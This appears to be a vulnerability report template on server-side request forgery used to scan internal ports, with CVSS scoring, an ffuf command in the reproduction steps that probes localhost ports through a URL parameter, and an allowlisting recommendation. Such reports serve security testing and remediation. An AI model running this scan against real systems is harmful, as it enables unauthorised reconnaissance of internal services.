# SSRF - Port Scanning and Service Discovery

**Title:** SSRF for Internal Port Scanning

**Severity:** High

**Impact:** High

**Exploitability:** Medium

**CVSS Base Score:** 7.5

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Vulnerability Type:** Server-Side Request Forgery

**Target:** URL parameter for fetching resources

## Impact

Discovery of internal services, potential further exploitation.

## Description

By controlling the target URL, attacker can scan internal ports and services.

## Steps to Reproduce

Use ffuf or similar with port list:

seq 1 10000 > ports.txt

ffuf -w ./ports.txt -u http://target/index.php -X POST -d "target=http://127.0.0.1:FUZZ" -fr "connection refused"

Observe responses for open ports (e.g. Redis, SMTP).

## Recommendation

Whitelist allowed hosts and ports. Use allowlists for protocols.

## References

OWASP SSRF and internal service examples.